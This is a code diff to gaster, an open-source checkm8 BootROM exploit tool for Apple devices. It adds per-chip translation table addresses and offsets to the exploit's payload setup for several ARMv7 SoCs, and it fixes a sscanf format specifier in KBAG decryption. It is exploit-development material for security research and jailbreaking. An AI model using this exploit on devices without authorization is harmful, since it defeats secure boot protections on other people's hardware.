@@ -210,7 +210,7 @@ static enum {
 static uint16_t cpid;
 static bool manual_reset;
 static unsigned usb_timeout;
-static uint32_t payload_dest_armv7;
+static uint32_t ttb_addr, payload_dest_armv7;
 static const char *pwnd_str = " PWND:[gaster]";
 static der_item_spec_t der_img4_item_specs[] = {
 	{ 0, DER_IA5_STR, 0 },
@@ -230,7 +230,7 @@ static struct {
 	uint16_t id_vendor, id_product, bcd_device;
 	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
 } device_descriptor;
-static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
+static size_t config_hole, ttb_rom_off, ttb_vrom_off, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
 static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, exit_critical_section, enter_critical_section, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
 
 static void
@@ -713,8 +713,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8950;
 			config_large_leak = 659;
 			config_overwrite_pad = 0x640;
+			ttb_addr = 0x1007C000;
 			patch_addr = 0x3F004D28;
 			memcpy_addr = 0x9ACC;
+			ttb_vrom_off = 0x3F0;
 			aes_crypto_cmd = 0x7301;
 			gUSBSerialNumber = 0x10061F80;
 			dfu_handle_request = 0x10061A24;
@@ -728,8 +730,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8955;
 			config_large_leak = 659;
 			config_overwrite_pad = 0x640;
+			ttb_addr = 0x1007C000;
 			patch_addr = 0x3F004D28;
 			memcpy_addr = 0x9B0C;
+			ttb_vrom_off = 0x3F0;
 			aes_crypto_cmd = 0x7341;
 			gUSBSerialNumber = 0x10061F80;
 			dfu_handle_request = 0x10061A24;
@@ -743,8 +747,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8947;
 			config_large_leak = 626;
 			config_overwrite_pad = 0x660;
+			ttb_addr = 0x3403C000;
 			patch_addr = 0x3F004950;
 			memcpy_addr = 0x9A3C;
+			ttb_vrom_off = 0x3F0;
 			aes_crypto_cmd = 0x7061;
 			gUSBSerialNumber = 0x3402DDF8;
 			dfu_handle_request = 0x3402D92C;
@@ -805,8 +811,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x7002;
 			config_hole = 64;
 			config_overwrite_pad = 0x300;
+			ttb_addr = 0x46008000;
 			patch_addr = 0x40003DEC;
 			memcpy_addr = 0x89F4;
+			ttb_vrom_off = 0x400;
 			aes_crypto_cmd = 0x6341;
 			gUSBSerialNumber = 0x46005958;
 			dfu_handle_request = 0x46005898;
@@ -881,8 +889,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8002;
 			config_hole = 5;
 			config_overwrite_pad = 0x5C0;
+			ttb_addr = 0x48808000;
 			patch_addr = 0x40004452;
 			memcpy_addr = 0xB6F8;
+			ttb_vrom_off = 0x400;
 			aes_crypto_cmd = 0x86DD;
 			gUSBSerialNumber = 0x48802AB8;
 			dfu_handle_request = 0x48806344;
@@ -896,8 +906,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8004;
 			config_hole = 5;
 			config_overwrite_pad = 0x5C0;
+			ttb_addr = 0x48808000;
 			patch_addr = 0x40004452;
 			memcpy_addr = 0xA884;
+			ttb_vrom_off = 0x400;
 			aes_crypto_cmd = 0x786D;
 			gUSBSerialNumber = 0x48802AE8;
 			dfu_handle_request = 0x48806384;
@@ -1249,11 +1261,11 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
 	} A9;
 	struct {
+		uint32_t pwnd[4], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr, ttb_vrom_addr, ttb_rom_addr;
+	} notA9_armv7;
+	struct {
 		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
 	} notA9;
-	struct {
-		uint32_t pwnd[4], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
-	} notA9_armv7;
 	struct {
 		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, usb_core_do_transfer;
 	} handle_checkm8_request;
@@ -1408,6 +1420,8 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				notA9_armv7.usb_create_string_descriptor = (uint32_t)usb_create_string_descriptor;
 				notA9_armv7.usb_serial_number_string_descriptor = (uint32_t)usb_serial_number_string_descriptor;
 				notA9_armv7.patch_addr = (uint32_t)patch_addr;
+				notA9_armv7.ttb_vrom_addr = (uint32_t)(ttb_addr + ttb_vrom_off);
+				notA9_armv7.ttb_rom_addr = (uint32_t)(ttb_addr + ttb_rom_off);
 				memcpy(data + data_sz, &notA9_armv7, sizeof(notA9_armv7));
 				data_sz += sizeof(notA9_armv7);
 				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
@@ -1845,7 +1859,7 @@ gaster_decrypt_kbag(usb_handle_t *handle, const char *kbag_str) {
 
 	if(strlen(kbag_str) == 2 * sizeof(kbag)) {
 		for(i = 0; i < sizeof(kbag); ++i) {
-			if(sscanf(&kbag_str[2 * i], "%02" PRIx8, &kbag[i]) != 1) {
+			if(sscanf(&kbag_str[2 * i], "%02" SCNx8, &kbag[i]) != 1) {
 				break;
 			}
 		}
